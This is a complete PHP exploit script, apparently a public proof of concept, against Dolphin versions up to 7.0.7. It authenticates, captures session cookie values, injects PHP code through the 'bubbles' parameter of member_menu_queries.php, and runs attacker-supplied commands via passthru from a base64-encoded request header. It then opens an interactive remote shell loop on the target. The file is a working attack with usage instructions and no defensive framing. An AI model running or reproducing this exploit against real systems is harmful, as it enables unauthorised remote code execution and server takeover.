<?
*/
 
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
 
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");
     
    fwrite($sock, $packet);
    return stream_get_contents($sock);
}
 
print "\n+------------------------------------------------------------+";
print "\n| Dolphin <= 7.0.7 Remote PHP Code Injection Exploit by EgiX |";
print "\n+------------------------------------------------------------+\n";
 
if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
    print "\nExample....: php $argv[0] localhost / user pass";
    print "\nExample....: php $argv[0] localhost /dolphin/ user pass\n";
    die();
}
 
$host = $argv[1];
$path = $argv[2];
 
$payload = "ID={$argv[3]}&Password={$argv[4]}";
$packet  = "POST {$path}member.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
     
if (!preg_match("/memberID=([0-9]+).*memberPassword=([0-9a-f]+)/is", http_send($host, $packet), $m)) die("\n[-] Login failed!\n");
 
$phpcode = "1);error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD])";
$packet  = "GET {$path}member_menu_queries.php?action=get_bubbles_values&bubbles=Friends:{$phpcode} HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: memberID={$m[1]}; memberPassword={$m[2]}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
 
while(1)
{
    print "\ndolphin-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/\r\n\r\n(.*)\{\"Friends/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
    print $m[1] : die("\n[-] Exploit failed!\n");
}
 
?>
